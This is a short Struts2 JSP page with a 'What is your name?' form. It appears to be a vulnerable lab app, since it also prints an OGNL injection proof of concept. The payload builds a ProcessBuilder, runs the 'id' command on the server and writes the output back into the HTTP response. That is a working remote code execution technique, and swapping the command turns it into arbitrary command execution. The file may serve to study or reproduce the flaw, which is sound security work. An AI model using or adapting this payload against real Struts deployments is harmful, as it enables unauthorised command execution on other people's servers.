<!DOCTYPE html PUBLIC
"-//W3C//DTD XHTML 1.1 Transitional//EN"
"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<%@taglib prefix="s" uri="/struts-tags" %>

<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
    <title>Index</title>
</head>
<body>


<s:form action="helloWorld">
    <s:textfield label="What is your name?" name="name"/>
    <s:submit/>
</s:form>


POC:<br>
%{#a=(new java.lang.ProcessBuilder(new
java.lang.String[]{"id"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new
java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new
char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new
java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}

</body>
</html>
	